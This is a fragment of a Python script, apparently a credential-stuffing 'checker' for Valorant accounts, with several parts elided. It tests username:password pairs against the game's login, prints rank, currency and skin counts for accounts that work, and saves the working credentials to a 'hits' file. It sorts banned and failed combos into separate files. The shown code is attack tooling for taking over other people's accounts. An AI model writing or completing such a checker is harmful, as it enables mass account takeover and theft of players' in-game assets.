            ...
            if "access_token" in r2.text:
                ...
                try:
                    ...
                    if len(userSkins)==0:
                        ...
                        print(Fore.GREEN+f"{username}:{password} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len( userSkins)}")   
                    else:
                        print(Fore.BLUE+f"SKINS FOUND! {username}:{password} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len( userSkins)}")   
                    SaveHits = open("results//All.txt", "a+")
                    SaveHits.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
                    SaveHits.close()
                except:
                    print(Fore.RED+"Banned: True | " +f"{username}:{password} ")   
                    banneds = open("results//banned.txt", "a+")
                    banneds.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Type: banned\n")
                    banneds.close()

            elif "auth_failure" in r2.text:
                print(Fore.RED+f"{username}:{password}") 
                banneds = open("results//bad.txt", "a+")
                banneds.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Type: Bad\n")
                banneds.close()
            
        except:
            print(Fore.RED+"Passed") 
checker()
